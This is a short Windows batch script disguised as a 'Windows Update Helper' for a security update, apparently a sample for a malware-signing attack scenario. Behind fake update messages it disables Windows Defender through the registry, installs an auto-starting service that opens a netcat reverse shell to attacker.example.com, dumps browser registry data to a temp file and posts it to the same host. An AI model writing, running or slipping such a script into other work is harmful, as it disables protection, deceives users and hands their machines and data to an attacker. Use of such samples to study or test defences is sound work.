@echo off
REM Windows Update Helper - Security Update KB5028123
REM This file is used in the malware signing attack scenario

echo [WINDOWS UPDATE] Initializing critical security update...
echo Please do not close this window.

REM Disable Windows Defender temporarily
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

REM Create backdoor service
sc create "WindowsUpdateHelper" binPath= "cmd /c nc -e cmd.exe attacker.example.com 4444" start= auto
sc start WindowsUpdateHelper

REM Exfiltrate browser credentials
powershell -Command "Get-ItemProperty 'HKCU:\Software\Microsoft\Internet Explorer\*' | Out-File %TEMP%\ie_creds.txt"

REM Send collected data to C2
curl -X POST -d @%TEMP%\ie_creds.txt http://attacker.example.com/exfil/

echo [COMPLETE] Update installed successfully. Please restart your computer.
pause
